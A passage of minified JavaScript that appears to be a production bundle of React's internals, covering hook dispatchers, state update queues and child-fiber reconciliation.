            if (typeof i != "function")
                throw Error(s(191, i));
            i.call(r)
        }
        function oy(i, r) {
            var a = i.callbacks;
            if (a !== null)
                for (i.callbacks = null,
                i = 0; i < a.length; i++)
                    ay(a[i], r)
        }
        var la = F(null)
          , Lc = F(0);
        function ly(i, r) {
            i = Pi,
            ae(Lc, i),
            ae(la, r),
            Pi = i | r.baseLanes
        }
        function sh() {
            ae(Lc, Pi),
            ae(la, la.current)
        }
        function ah() {
            Pi = Lc.current,
            ne(la),
            ne(Lc)
        }
        var gr = 0
          , De = null
          , et = null
          , St = null
          , Uc = !1
          , ca = !1
          , as = !1
          , jc = 0
          , Ho = 0
          , ua = null
          , Ix = 0;
        function _t() {
            throw Error(s(321))
        }
        function oh(i, r) {
            if (r === null)
                return !1;
            for (var a = 0; a < r.length && a < i.length; a++)
                if (!yn(i[a], r[a]))
                    return !1;
            return !0
        }
        function lh(i, r, a, c, f, g) {
            return gr = g,
            De = r,
            r.memoizedState = null,
            r.updateQueue = null,
            r.lanes = 0,
            T.H = i === null || i.memoizedState === null ? Qy : Vy,
            as = !1,
            g = a(c, f),
            as = !1,
            ca && (g = uy(r, a, c, f)),
            cy(i),
            g
        }
        function cy(i) {
            T.H = Fc;
            var r = et !== null && et.next !== null;
            if (gr = 0,
            St = et = De = null,
            Uc = !1,
            Ho = 0,
            ua = null,
            r)
                throw Error(s(300));
            i === null || Nt || (i = i.dependencies,
            i !== null && kc(i) && (Nt = !0))
        }
        function uy(i, r, a, c) {
            De = i;
            var f = 0;
            do {
                if (ca && (ua = null),
                Ho = 0,
                ca = !1,
                25 <= f)
                    throw Error(s(301));
                if (f += 1,
                St = et = null,
                i.updateQueue != null) {
                    var g = i.updateQueue;
                    g.lastEffect = null,
                    g.events = null,
                    g.stores = null,
                    g.memoCache != null && (g.memoCache.index = 0)
                }
                T.H = Ux,
                g = r(a, c)
            } while (ca);
            return g
        }
        function kx() {
            var i = T.H
              , r = i.useState()[0];
            return r = typeof r.then == "function" ? zo(r) : r,
            i = i.useState()[0],
            (et !== null ? et.memoizedState : null) !== i && (De.flags |= 1024),
            r
        }
        function ch() {
            var i = jc !== 0;
            return jc = 0,
            i
        }
        function uh(i, r, a) {
            r.updateQueue = i.updateQueue,
            r.flags &= -2053,
            i.lanes &= ~a
        }
        function dh(i) {
            if (Uc) {
                for (i = i.memoizedState; i !== null; ) {
                    var r = i.queue;
                    r !== null && (r.pending = null),
                    i = i.next
                }
                Uc = !1
            }
            gr = 0,
            St = et = De = null,
            ca = !1,
            Ho = jc = 0,
            ua = null
        }
        function on() {
            var i = {
                memoizedState: null,
                baseState: null,
                baseQueue: null,
                queue: null,
                next: null
            };
            return St === null ? De.memoizedState = St = i : St = St.next = i,
            St
        }
        function Tt() {
            if (et === null) {
                var i = De.alternate;
                i = i !== null ? i.memoizedState : null
            } else
                i = et.next;
            var r = St === null ? De.memoizedState : St.next;
            if (r !== null)
                St = r,
                et = i;
            else {
                if (i === null)
                    throw De.alternate === null ? Error(s(467)) : Error(s(310));
                et = i,
                i = {
                    memoizedState: et.memoizedState,
                    baseState: et.baseState,
                    baseQueue: et.baseQueue,
                    queue: et.queue,
                    next: null
                },
                St === null ? De.memoizedState = St = i : St = St.next = i
            }
            return St
        }
        function fh() {
            return {
                lastEffect: null,
                events: null,
                stores: null,
                memoCache: null
            }
        }
        function zo(i) {
            var r = Ho;
            return Ho += 1,
            ua === null && (ua = []),
            i = iy(ua, i, r),
            r = De,
            (St === null ? r.memoizedState : St.next) === null && (r = r.alternate,
            T.H = r === null || r.memoizedState === null ? Qy : Vy),
            i
        }
        function Pc(i) {
            if (i !== null && typeof i == "object") {
                if (typeof i.then == "function")
                    return zo(i);
                if (i.$$typeof === O)
                    return Ft(i)
            }
            throw Error(s(438, String(i)))
        }
        function hh(i) {
            var r = null
              , a = De.updateQueue;
            if (a !== null && (r = a.memoCache),
            r == null) {
                var c = De.alternate;
                c !== null && (c = c.updateQueue,
                c !== null && (c = c.memoCache,
                c != null && (r = {
                    data: c.data.map(function(f) {
                        return f.slice()
                    }),
                    index: 0
                })))
            }
            if (r == null && (r = {
                data: [],
                index: 0
            }),
            a === null && (a = fh(),
            De.updateQueue = a),
            a.memoCache = r,
            a = r.data[r.index],
            a === void 0)
                for (a = r.data[r.index] = Array(i),
                c = 0; c < i; c++)
                    a[c] = Z;
            return r.index++,
            a
        }
        function Ni(i, r) {
            return typeof r == "function" ? r(i) : r
        }
        function Hc(i) {
            var r = Tt();
            return mh(r, et, i)
        }
        function mh(i, r, a) {
            var c = i.queue;
            if (c === null)
                throw Error(s(311));
            c.lastRenderedReducer = a;
            var f = i.baseQueue
              , g = c.pending;
            if (g !== null) {
                if (f !== null) {
                    var v = f.next;
                    f.next = g.next,
                    g.next = v
                }
                r.baseQueue = f = g,
                c.pending = null
            }
            if (g = i.baseState,
            f === null)
                i.memoizedState = g;
            else {
                r = f.next;
                var A = v = null
                  , C = null
                  , j = r
                  , V = !1;
                do {
                    var $ = j.lane & -536870913;
                    if ($ !== j.lane ? (qe & $) === $ : (gr & $) === $) {
                        var H = j.revertLane;
                        if (H === 0)
                            C !== null && (C = C.next = {
                                lane: 0,
                                revertLane: 0,
                                action: j.action,
                                hasEagerState: j.hasEagerState,
                                eagerState: j.eagerState,
                                next: null
                            }),
                            $ === aa && (V = !0);
                        else if ((gr & H) === H) {
                            j = j.next,
                            H === aa && (V = !0);
                            continue
                        } else
                            $ = {
                                lane: 0,
                                revertLane: j.revertLane,
                                action: j.action,
                                hasEagerState: j.hasEagerState,
                                eagerState: j.eagerState,
                                next: null
                            },
                            C === null ? (A = C = $,
                            v = g) : C = C.next = $,
                            De.lanes |= H,
                            Er |= H;
                        $ = j.action,
                        as && a(g, $),
                        g = j.hasEagerState ? j.eagerState : a(g, $)
                    } else
                        H = {
                            lane: $,
                            revertLane: j.revertLane,
                            action: j.action,
                            hasEagerState: j.hasEagerState,
                            eagerState: j.eagerState,
                            next: null
                        },
                        C === null ? (A = C = H,
                        v = g) : C = C.next = H,
                        De.lanes |= $,
                        Er |= $;
                    j = j.next
                } while (j !== null && j !== r);
                if (C === null ? v = g : C.next = A,
                !yn(g, i.memoizedState) && (Nt = !0,
                V && (a = oa,
                a !== null)))
                    throw a;
                i.memoizedState = g,
                i.baseState = v,
                i.baseQueue = C,
                c.lastRenderedState = g
            }
            return f === null && (c.lanes = 0),
            [i.memoizedState, c.dispatch]
        }
        function ph(i) {
            var r = Tt()
              , a = r.queue;
            if (a === null)
                throw Error(s(311));
            a.lastRenderedReducer = i;
            var c = a.dispatch
              , f = a.pending
              , g = r.memoizedState;
            if (f !== null) {
                a.pending = null;
                var v = f = f.next;
                do
                    g = i(g, v.action),
                    v = v.next;
                while (v !== f);
                yn(g, r.memoizedState) || (Nt = !0),
                r.memoizedState = g,
                r.baseQueue === null && (r.baseState = g),
                a.lastRenderedState = g
            }
            return [g, c]
        }
        function dy(i, r, a) {
            var c = De
              , f = Tt()
              , g = Ze;
            if (g) {
                if (a === void 0)
                    throw Error(s(407));
                a = a()
            } else
                a = r();
            var v = !yn((et || f).memoizedState, a);
            v && (f.memoizedState = a,
            Nt = !0),
            f = f.queue;
            var A = my.bind(null, c, f, i);
            if (Go(2048, 8, A, [i]),
            f.getSnapshot !== r || v || St !== null && St.memoizedState.tag & 1) {
                if (c.flags |= 2048,
                da(9, zc(), hy.bind(null, c, f, a, r), null),
                at === null)
                    throw Error(s(349));
                g || (gr & 124) !== 0 || fy(c, r, a)
            }
            return a
        }
        function fy(i, r, a) {
            i.flags |= 16384,
            i = {
                getSnapshot: r,
                value: a
            },
            r = De.updateQueue,
            r === null ? (r = fh(),
            De.updateQueue = r,
            r.stores = [i]) : (a = r.stores,
            a === null ? r.stores = [i] : a.push(i))
        }
        function hy(i, r, a, c) {
            r.value = a,
            r.getSnapshot = c,
            py(r) && gy(i)
        }
        function my(i, r, a) {
            return a(function() {
                py(r) && gy(i)
            })
        }
        function py(i) {
            var r = i.getSnapshot;
            i = i.value;
            try {
                var a = r();
                return !yn(i, a)
            } catch {
                return !0
            }
        }
        function gy(i) {
            var r = na(i, 2);
            r !== null && En(r, i, 2)
        }
        function gh(i) {
            var r = on();
            if (typeof i == "function") {
                var a = i;
                if (i = a(),
                as) {
                    ke(!0);
                    try {
                        a()
                    } finally {
                        ke(!1)
                    }
                }
            }
            return r.memoizedState = r.baseState = i,
            r.queue = {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: Ni,
                lastRenderedState: i
            },
            r
        }
        function yy(i, r, a, c) {
            return i.baseState = a,
            mh(i, et, typeof c == "function" ? c : Ni)
        }
        function Ox(i, r, a, c, f) {
            if (qc(i))
                throw Error(s(485));
            if (i = r.action,
            i !== null) {
                var g = {
                    payload: f,
                    action: i,
                    next: null,
                    isTransition: !0,
                    status: "pending",
                    value: null,
                    reason: null,
                    listeners: [],
                    then: function(v) {
                        g.listeners.push(v)
                    }
                };
                T.T !== null ? a(!0) : g.isTransition = !1,
                c(g),
                a = r.pending,
                a === null ? (g.next = r.pending = g,
                vy(r, g)) : (g.next = a.next,
                r.pending = a.next = g)
            }
        }
        function vy(i, r) {
            var a = r.action
              , c = r.payload
              , f = i.state;
            if (r.isTransition) {
                var g = T.T
                  , v = {};
                T.T = v;
                try {
                    var A = a(f, c)
                      , C = T.S;
                    C !== null && C(v, A),
                    by(i, r, A)
                } catch (j) {
                    yh(i, r, j)
                } finally {
                    T.T = g
                }
            } else
                try {
                    g = a(f, c),
                    by(i, r, g)
                } catch (j) {
                    yh(i, r, j)
                }
        }
        function by(i, r, a) {
            a !== null && typeof a == "object" && typeof a.then == "function" ? a.then(function(c) {
                Ay(i, r, c)
            }, function(c) {
                return yh(i, r, c)
            }) : Ay(i, r, a)
        }
        function Ay(i, r, a) {
            r.status = "fulfilled",
            r.value = a,
            wy(r),
            i.state = a,
            r = i.pending,
            r !== null && (a = r.next,
            a === r ? i.pending = null : (a = a.next,
            r.next = a,
            vy(i, a)))
        }
        function yh(i, r, a) {
            var c = i.pending;
            if (i.pending = null,
            c !== null) {
                c = c.next;
                do
                    r.status = "rejected",
                    r.reason = a,
                    wy(r),
                    r = r.next;
                while (r !== c)
            }
            i.action = null
        }
        function wy(i) {
            i = i.listeners;
            for (var r = 0; r < i.length; r++)
                (0,
                i[r])()
        }
        function _y(i, r) {
            return r
        }
        function Ey(i, r) {
            if (Ze) {
                var a = at.formState;
                if (a !== null) {
                    e: {
                        var c = De;
                        if (Ze) {
                            if (bt) {
                                t: {
                                    for (var f = bt, g = si; f.nodeType !== 8; ) {
                                        if (!g) {
                                            f = null;
                                            break t
                                        }
                                        if (f = Xn(f.nextSibling),
                                        f === null) {
                                            f = null;
                                            break t
                                        }
                                    }
                                    g = f.data,
                                    f = g === "F!" || g === "F" ? f : null
                                }
                                if (f) {
                                    bt = Xn(f.nextSibling),
                                    c = f.data === "F!";
                                    break e
                                }
                            }
                            ns(c)
                        }
                        c = !1
                    }
                    c && (r = a[0])
                }
            }
            return a = on(),
            a.memoizedState = a.baseState = r,
            c = {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: _y,
                lastRenderedState: r
            },
            a.queue = c,
            a = Gy.bind(null, De, c),
            c.dispatch = a,
            c = gh(!1),
            g = _h.bind(null, De, !1, c.queue),
            c = on(),
            f = {
                state: r,
                dispatch: null,
                action: i,
                pending: null
            },
            c.queue = f,
            a = Ox.bind(null, De, f, g, a),
            f.dispatch = a,
            c.memoizedState = i,
            [r, a, !1]
        }
        function xy(i) {
            var r = Tt();
            return Sy(r, et, i)
        }
        function Sy(i, r, a) {
            if (r = mh(i, r, _y)[0],
            i = Hc(Ni)[0],
            typeof r == "object" && r !== null && typeof r.then == "function")
                try {
                    var c = zo(r)
                } catch (v) {
                    throw v === Do ? Mc : v
                }
            else
                c = r;
            r = Tt();
            var f = r.queue
              , g = f.dispatch;
            return a !== r.memoizedState && (De.flags |= 2048,
            da(9, zc(), Nx.bind(null, f, a), null)),
            [c, g, i]
        }
        function Nx(i, r) {
            i.action = r
        }
        function Ty(i) {
            var r = Tt()
              , a = et;
            if (a !== null)
                return Sy(r, a, i);
            Tt(),
            r = r.memoizedState,
            a = Tt();
            var c = a.queue.dispatch;
            return a.memoizedState = i,
            [r, c, !1]
        }
        function da(i, r, a, c) {
            return i = {
                tag: i,
                create: a,
                deps: c,
                inst: r,
                next: null
            },
            r = De.updateQueue,
            r === null && (r = fh(),
            De.updateQueue = r),
            a = r.lastEffect,
            a === null ? r.lastEffect = i.next = i : (c = a.next,
            a.next = i,
            i.next = c,
            r.lastEffect = i),
            i
        }
        function zc() {
            return {
                destroy: void 0,
                resource: void 0
            }
        }
        function Ry() {
            return Tt().memoizedState
        }
        function Gc(i, r, a, c) {
            var f = on();
            c = c === void 0 ? null : c,
            De.flags |= i,
            f.memoizedState = da(1 | r, zc(), a, c)
        }
        function Go(i, r, a, c) {
            var f = Tt();
            c = c === void 0 ? null : c;
            var g = f.memoizedState.inst;
            et !== null && c !== null && oh(c, et.memoizedState.deps) ? f.memoizedState = da(r, g, a, c) : (De.flags |= i,
            f.memoizedState = da(1 | r, g, a, c))
        }
        function By(i, r) {
            Gc(8390656, 8, i, r)
        }
        function Cy(i, r) {
            Go(2048, 8, i, r)
        }
        function Iy(i, r) {
            return Go(4, 2, i, r)
        }
        function ky(i, r) {
            return Go(4, 4, i, r)
        }
        function Oy(i, r) {
            if (typeof r == "function") {
                i = i();
                var a = r(i);
                return function() {
                    typeof a == "function" ? a() : r(null)
                }
            }
            if (r != null)
                return i = i(),
                r.current = i,
                function() {
                    r.current = null
                }
        }
        function Ny(i, r, a) {
            a = a != null ? a.concat([i]) : null,
            Go(4, 4, Oy.bind(null, r, i), a)
        }
        function vh() {}
        function My(i, r) {
            var a = Tt();
            r = r === void 0 ? null : r;
            var c = a.memoizedState;
            return r !== null && oh(r, c[1]) ? c[0] : (a.memoizedState = [i, r],
            i)
        }
        function Dy(i, r) {
            var a = Tt();
            r = r === void 0 ? null : r;
            var c = a.memoizedState;
            if (r !== null && oh(r, c[1]))
                return c[0];
            if (c = i(),
            as) {
                ke(!0);
                try {
                    i()
                } finally {
                    ke(!1)
                }
            }
            return a.memoizedState = [c, r],
            c
        }
        function bh(i, r, a) {
            return a === void 0 || (gr & 1073741824) !== 0 ? i.memoizedState = r : (i.memoizedState = a,
            i = jv(),
            De.lanes |= i,
            Er |= i,
            a)
        }
        function Ly(i, r, a, c) {
            return yn(a, r) ? a : la.current !== null ? (i = bh(i, a, c),
            yn(i, r) || (Nt = !0),
            i) : (gr & 42) === 0 ? (Nt = !0,
            i.memoizedState = a) : (i = jv(),
            De.lanes |= i,
            Er |= i,
            r)
        }
        function Uy(i, r, a, c, f) {
            var g = P.p;
            P.p = g !== 0 && 8 > g ? g : 8;
            var v = T.T
              , A = {};
            T.T = A,
            _h(i, !1, r, a);
            try {
                var C = f()
                  , j = T.S;
                if (j !== null && j(A, C),
                C !== null && typeof C == "object" && typeof C.then == "function") {
                    var V = Cx(C, c);
                    qo(i, r, V, _n(i))
                } else
                    qo(i, r, c, _n(i))
            } catch ($) {
                qo(i, r, {
                    then: function() {},
                    status: "rejected",
                    reason: $
                }, _n())
            } finally {
                P.p = g,
                T.T = v
            }
        }
        function Mx() {}
        function Ah(i, r, a, c) {
            if (i.tag !== 5)
                throw Error(s(476));
            var f = jy(i).queue;
            Uy(i, f, r, J, a === null ? Mx : function() {
                return Py(i),
                a(c)
            }
            )
        }
        function jy(i) {
            var r = i.memoizedState;
            if (r !== null)
                return r;
            r = {
                memoizedState: J,
                baseState: J,
                baseQueue: null,
                queue: {
                    pending: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: Ni,
                    lastRenderedState: J
                },
                next: null
            };
            var a = {};
            return r.next = {
                memoizedState: a,
                baseState: a,
                baseQueue: null,
                queue: {
                    pending: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: Ni,
                    lastRenderedState: a
                },
                next: null
            },
            i.memoizedState = r,
            i = i.alternate,
            i !== null && (i.memoizedState = r),
            r
        }
        function Py(i) {
            var r = jy(i).next.queue;
            qo(i, r, {}, _n())
        }
        function wh() {
            return Ft(ol)
        }
        function Hy() {
            return Tt().memoizedState
        }
        function zy() {
            return Tt().memoizedState
        }
        function Dx(i) {
            for (var r = i.return; r !== null; ) {
                switch (r.tag) {
                case 24:
                case 3:
                    var a = _n();
                    i = mr(a);
                    var c = pr(r, i, a);
                    c !== null && (En(c, r, a),
                    Uo(c, r, a)),
                    r = {
                        cache: Jf()
                    },
                    i.payload = r;
                    return
                }
                r = r.return
            }
        }
        function Lx(i, r, a) {
            var c = _n();
            a = {
                lane: c,
                revertLane: 0,
                action: a,
                hasEagerState: !1,
                eagerState: null,
                next: null
            },
            qc(i) ? qy(r, a) : (a = zf(i, r, a, c),
            a !== null && (En(a, i, c),
            Fy(a, r, c)))
        }
        function Gy(i, r, a) {
            var c = _n();
            qo(i, r, a, c)
        }
        function qo(i, r, a, c) {
            var f = {
                lane: c,
                revertLane: 0,
                action: a,
                hasEagerState: !1,
                eagerState: null,
                next: null
            };
            if (qc(i))
                qy(r, f);
            else {
                var g = i.alternate;
                if (i.lanes === 0 && (g === null || g.lanes === 0) && (g = r.lastRenderedReducer,
                g !== null))
                    try {
                        var v = r.lastRenderedState
                          , A = g(v, a);
                        if (f.hasEagerState = !0,
                        f.eagerState = A,
                        yn(A, v))
                            return Tc(i, r, f, 0),
                            at === null && Sc(),
                            !1
                    } catch {} finally {}
                if (a = zf(i, r, f, c),
                a !== null)
                    return En(a, i, c),
                    Fy(a, r, c),
                    !0
            }
            return !1
        }
        function _h(i, r, a, c) {
            if (c = {
                lane: 2,
                revertLane: em(),
                action: c,
                hasEagerState: !1,
                eagerState: null,
                next: null
            },
            qc(i)) {
                if (r)
                    throw Error(s(479))
            } else
                r = zf(i, a, c, 2),
                r !== null && En(r, i, 2)
        }
        function qc(i) {
            var r = i.alternate;
            return i === De || r !== null && r === De
        }
        function qy(i, r) {
            ca = Uc = !0;
            var a = i.pending;
            a === null ? r.next = r : (r.next = a.next,
            a.next = r),
            i.pending = r
        }
        function Fy(i, r, a) {
            if ((a & 4194048) !== 0) {
                var c = r.lanes;
                c &= i.pendingLanes,
                a |= c,
                r.lanes = a,
                $0(i, a)
            }
        }
        var Fc = {
            readContext: Ft,
            use: Pc,
            useCallback: _t,
            useContext: _t,
            useEffect: _t,
            useImperativeHandle: _t,
            useLayoutEffect: _t,
            useInsertionEffect: _t,
            useMemo: _t,
            useReducer: _t,
            useRef: _t,
            useState: _t,
            useDebugValue: _t,
            useDeferredValue: _t,
            useTransition: _t,
            useSyncExternalStore: _t,
            useId: _t,
            useHostTransitionStatus: _t,
            useFormState: _t,
            useActionState: _t,
            useOptimistic: _t,
            useMemoCache: _t,
            useCacheRefresh: _t
        }
          , Qy = {
            readContext: Ft,
            use: Pc,
            useCallback: function(i, r) {
                return on().memoizedState = [i, r === void 0 ? null : r],
                i
            },
            useContext: Ft,
            useEffect: By,
            useImperativeHandle: function(i, r, a) {
                a = a != null ? a.concat([i]) : null,
                Gc(4194308, 4, Oy.bind(null, r, i), a)
            },
            useLayoutEffect: function(i, r) {
                return Gc(4194308, 4, i, r)
            },
            useInsertionEffect: function(i, r) {
                Gc(4, 2, i, r)
            },
            useMemo: function(i, r) {
                var a = on();
                r = r === void 0 ? null : r;
                var c = i();
                if (as) {
                    ke(!0);
                    try {
                        i()
                    } finally {
                        ke(!1)
                    }
                }
                return a.memoizedState = [c, r],
                c
            },
            useReducer: function(i, r, a) {
                var c = on();
                if (a !== void 0) {
                    var f = a(r);
                    if (as) {
                        ke(!0);
                        try {
                            a(r)
                        } finally {
                            ke(!1)
                        }
                    }
                } else
                    f = r;
                return c.memoizedState = c.baseState = f,
                i = {
                    pending: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: i,
                    lastRenderedState: f
                },
                c.queue = i,
                i = i.dispatch = Lx.bind(null, De, i),
                [c.memoizedState, i]
            },
            useRef: function(i) {
                var r = on();
                return i = {
                    current: i
                },
                r.memoizedState = i
            },
            useState: function(i) {
                i = gh(i);
                var r = i.queue
                  , a = Gy.bind(null, De, r);
                return r.dispatch = a,
                [i.memoizedState, a]
            },
            useDebugValue: vh,
            useDeferredValue: function(i, r) {
                var a = on();
                return bh(a, i, r)
            },
            useTransition: function() {
                var i = gh(!1);
                return i = Uy.bind(null, De, i.queue, !0, !1),
                on().memoizedState = i,
                [!1, i]
            },
            useSyncExternalStore: function(i, r, a) {
                var c = De
                  , f = on();
                if (Ze) {
                    if (a === void 0)
                        throw Error(s(407));
                    a = a()
                } else {
                    if (a = r(),
                    at === null)
                        throw Error(s(349));
                    (qe & 124) !== 0 || fy(c, r, a)
                }
                f.memoizedState = a;
                var g = {
                    value: a,
                    getSnapshot: r
                };
                return f.queue = g,
                By(my.bind(null, c, g, i), [i]),
                c.flags |= 2048,
                da(9, zc(), hy.bind(null, c, g, a, r), null),
                a
            },
            useId: function() {
                var i = on()
                  , r = at.identifierPrefix;
                if (Ze) {
                    var a = Ii
                      , c = Ci;
                    a = (c & ~(1 << 32 - dt(c) - 1)).toString(32) + a,
                    r = "«" + r + "R" + a,
                    a = jc++,
                    0 < a && (r += "H" + a.toString(32)),
                    r += "»"
                } else
                    a = Ix++,
                    r = "«" + r + "r" + a.toString(32) + "»";
                return i.memoizedState = r
            },
            useHostTransitionStatus: wh,
            useFormState: Ey,
            useActionState: Ey,
            useOptimistic: function(i) {
                var r = on();
                r.memoizedState = r.baseState = i;
                var a = {
                    pending: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: null,
                    lastRenderedState: null
                };
                return r.queue = a,
                r = _h.bind(null, De, !0, a),
                a.dispatch = r,
                [i, r]
            },
            useMemoCache: hh,
            useCacheRefresh: function() {
                return on().memoizedState = Dx.bind(null, De)
            }
        }
          , Vy = {
            readContext: Ft,
            use: Pc,
            useCallback: My,
            useContext: Ft,
            useEffect: Cy,
            useImperativeHandle: Ny,
            useInsertionEffect: Iy,
            useLayoutEffect: ky,
            useMemo: Dy,
            useReducer: Hc,
            useRef: Ry,
            useState: function() {
                return Hc(Ni)
            },
            useDebugValue: vh,
            useDeferredValue: function(i, r) {
                var a = Tt();
                return Ly(a, et.memoizedState, i, r)
            },
            useTransition: function() {
                var i = Hc(Ni)[0]
                  , r = Tt().memoizedState;
                return [typeof i == "boolean" ? i : zo(i), r]
            },
            useSyncExternalStore: dy,
            useId: Hy,
            useHostTransitionStatus: wh,
            useFormState: xy,
            useActionState: xy,
            useOptimistic: function(i, r) {
                var a = Tt();
                return yy(a, et, i, r)
            },
            useMemoCache: hh,
            useCacheRefresh: zy
        }
          , Ux = {
            readContext: Ft,
            use: Pc,
            useCallback: My,
            useContext: Ft,
            useEffect: Cy,
            useImperativeHandle: Ny,
            useInsertionEffect: Iy,
            useLayoutEffect: ky,
            useMemo: Dy,
            useReducer: ph,
            useRef: Ry,
            useState: function() {
                return ph(Ni)
            },
            useDebugValue: vh,
            useDeferredValue: function(i, r) {
                var a = Tt();
                return et === null ? bh(a, i, r) : Ly(a, et.memoizedState, i, r)
            },
            useTransition: function() {
                var i = ph(Ni)[0]
                  , r = Tt().memoizedState;
                return [typeof i == "boolean" ? i : zo(i), r]
            },
            useSyncExternalStore: dy,
            useId: Hy,
            useHostTransitionStatus: wh,
            useFormState: Ty,
            useActionState: Ty,
            useOptimistic: function(i, r) {
                var a = Tt();
                return et !== null ? yy(a, et, i, r) : (a.baseState = i,
                [i, a.queue.dispatch])
            },
            useMemoCache: hh,
            useCacheRefresh: zy
        }
          , fa = null
          , Fo = 0;
        function Qc(i) {
            var r = Fo;
            return Fo += 1,
            fa === null && (fa = []),
            iy(fa, i, r)
        }
        function Qo(i, r) {
            r = r.props.ref,
            i.ref = r !== void 0 ? r : null
        }
        function Vc(i, r) {
            throw r.$$typeof === y ? Error(s(525)) : (i = Object.prototype.toString.call(r),
            Error(s(31, i === "[object Object]" ? "object with keys {" + Object.keys(r).join(", ") + "}" : i)))
        }
        function Yy(i) {
            var r = i._init;
            return r(i._payload)
        }
        function Zy(i) {
            function r(M, N) {
                if (i) {
                    var U = M.deletions;
                    U === null ? (M.deletions = [N],
                    M.flags |= 16) : U.push(N)
                }
            }
            function a(M, N) {
                if (!i)
                    return null;
                for (; N !== null; )
                    r(M, N),
                    N = N.sibling;
                return null
            }
            function c(M) {
                for (var N = new Map; M !== null; )
                    M.key !== null ? N.set(M.key, M) : N.set(M.index, M),
                    M = M.sibling;
                return N
            }
            function f(M, N) {
                return M = Bi(M, N),
                M.index = 0,
                M.sibling = null,
                M
            }
            function g(M, N, U) {
                return M.index = U,
                i ? (U = M.alternate,
                U !== null ? (U = U.index,
                U < N ? (M.flags |= 67108866,
                N) : U) : (M.flags |= 67108866,
                N)) : (M.flags |= 1048576,
                N)
            }
            function v(M) {
                return i && M.alternate === null && (M.flags |= 67108866),
                M
            }
            function A(M, N, U, X) {
                return N === null || N.tag !== 6 ? (N = qf(U, M.mode, X),
                N.return = M,
                N) : (N = f(N, U),
                N.return = M,
                N)
            }
            function C(M, N, U, X) {
                var me = U.type;
                return me === S ? V(M, N, U.props.children, X, U.key) : N !== null && (N.elementType === me || typeof me == "object" && me !== null && me.$$typeof === D && Yy(me) === N.type) ? (N = f(N, U.props),
                Qo(N, U),
                N.return = M,
                N) : (N = Bc(U.type, U.key, U.props, null, M.mode, X),
                Qo(N, U),
                N.return = M,
                N)
            }
            function j(M, N, U, X) {
                return N === null || N.tag !== 4 || N.stateNode.containerInfo !== U.containerInfo || N.stateNode.implementation !== U.implementation ? (N = Ff(U, M.mode, X),
                N.return = M,
                N) : (N = f(N, U.children || []),
                N.return = M,
                N)
            }
            function V(M, N, U, X, me) {
                return N === null || N.tag !== 7 ? (N = $r(U, M.mode, X, me),
                N.return = M,
                N) : (N = f(N, U),
                N.return = M,
                N)
            }
            function $(M, N, U) {
                if (typeof N == "string" && N !== "" || typeof N == "number" || typeof N == "bigint")
                    return N = qf("" + N, M.mode, U),
                    N.return = M,
                    N;
                if (typeof N == "object" && N !== null) {
                    switch (N.$$typeof) {
                    case w:
                        return U = Bc(N.type, N.key, N.props, null, M.mode, U),
                        Qo(U, N),
                        U.return = M,
                        U;
                    case E:
                        return N = Ff(N, M.mode, U),
                        N.return = M,
                        N;
                    case D:
                        var X = N._init;
                        return N = X(N._payload),
                        $(M, N, U)
                    }
                    if (B(N) || le(N))
                        return N = $r(N, M.mode, U, null),
                        N.return = M,
                        N;
                    if (typeof N.then == "function")
                        return $(M, Qc(N), U);
                    if (N.$$typeof === O)
                        return $(M, Oc(M, N), U);
                    Vc(M, N)
                }
                return null
            }
            function H(M, N, U, X) {
                var me = N !== null ? N.key : null;
                if (typeof U == "string" && U !== "" || typeof U == "number" || typeof U == "bigint")
                    return me !== null ? null : A(M, N, "" + U, X);
                if (typeof U == "object" && U !== null) {
                    switch (U.$$typeof) {
                    case w:
                        return U.key === me ? C(M, N, U, X) : null;
                    case E:
                        return U.key === me ? j(M, N, U, X) : null;
                    case D:
                        return me = U._init,
                        U = me(U._payload),
                        H(M, N, U, X)
                    }
                    if (B(U) || le(U))
                        return me !== null ? null : V(M, N, U, X, null);
                    if (typeof U.then == "function")
                        return H(M, N, Qc(U), X);
                    if (U.$$typeof === O)
                        return H(M, N, Oc(M, U), X);
                    Vc(M, U)
                }
                return null
            }
            function G(M, N, U, X, me) {
                if (typeof X == "string" && X !== "" || typeof X == "number" || typeof X == "bigint")
                    return M = M.get(U) || null,
                    A(N, M, "" + X, me);
                if (typeof X == "object" && X !== null) {
                    switch (X.$$typeof) {
                    case w:
                        return M = M.get(X.key === null ? U : X.key) || null,
                        C(N, M, X, me);
                    case E:
                        return M = M.get(X.key === null ? U : X.key) || null,
                        j(N, M, X, me);
                    case D:
                        var Ue = X._init;
                        return X = Ue(X._payload),
                        G(M, N, U, X, me)
                    }
                    if (B(X) || le(X))
                        return M = M.get(U) || null,
                        V(N, M, X, me, null);
                    if (typeof X.then == "function")
                        return G(M, N, U, Qc(X), me);
                    if (X.$$typeof === O)
                        return G(M, N, U, Oc(N, X), me);
                    Vc(N, X)
                }
                return null
            }
            function Te(M, N, U, X) {
                for (var me = null, Ue = null, ge = N, _e = N = 0, Dt = null; ge !== null && _e < U.length; _e++) {
                    ge.index > _e ? (Dt = ge,
                    ge = null) : Dt = ge.sibling;
                    var Ve = H(M, ge, U[_e], X);
                    if (Ve === null) {
                        ge === null && (ge = Dt);
                        break
                    }
                    i && ge && Ve.alternate === null && r(M, ge),
                    N = g(Ve, N, _e),
                    Ue === null ? me = Ve : Ue.sibling = Ve,
                    Ue = Ve,
                    ge = Dt
                }
                if (_e === U.length)
                    return a(M, ge),
                    Ze && es(M, _e),
                    me;
                if (ge === null) {
                    for (; _e < U.length; _e++)
                        ge = $(M, U[_e], X),
                        ge !== null && (N = g(ge, N, _e),
                        Ue === null ? me = ge : Ue.sibling = ge,
                        Ue = ge);
                    return Ze && es(M, _e),
                    me
                }
                for (ge = c(ge); _e < U.length; _e++)
                    Dt = G(ge, M, _e, U[_e], X),
                    Dt !== null && (i && Dt.alternate !== null && ge.delete(Dt.key === null ? _e : Dt.key),
                    N = g(Dt, N, _e),
                    Ue === null ? me = Dt : Ue.sibling = Dt,
                    Ue = Dt);
                return i && ge.forEach(function(Or) {
                    return r(M, Or)
                }),
                Ze && es(M, _e),
                me
            }
            function we(M, N, U, X) {
                if (U == null)
                    throw Error(s(151));
                for (var me = null, Ue = null, ge = N, _e = N = 0, Dt = null, Ve = U.next(); ge !== null && !Ve.done; _e++,
